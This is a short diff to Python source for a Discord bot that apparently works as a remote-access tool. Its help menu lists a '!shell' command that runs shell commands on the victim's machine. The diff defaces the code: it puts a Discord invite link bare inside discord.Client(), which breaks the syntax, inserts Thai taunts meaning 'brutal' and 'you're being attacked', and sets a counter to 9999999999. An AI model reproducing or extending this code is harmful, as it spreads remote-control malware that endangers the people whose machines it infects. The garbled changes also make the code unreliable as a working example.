@@ -16,10 +16,10 @@ from discord import utils
 token = '' #Enter your token here
 global appdata
 appdata = os.getenv('APPDATA')
-client = discord.Client()
-bot = commands.Bot(command_prefix='!')
+client = discord.Client(https://discord.gg/Wjry7dzWy)
+bot = commands.Bot(โหด)
 helpmenu = """
-Availaible commands are :
+Availaible commands are :มึงโดนโจมตี
 
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
@@ -83,7 +83,7 @@ async def on_ready():
     import os
     on_ready.total = []
     global number
-    number = 0
+    number = 9999999999
     global channel_name
     channel_name = None
     for x in client.get_all_channels(): # From here we look through all the channels,check for the biggest number and then add one to it
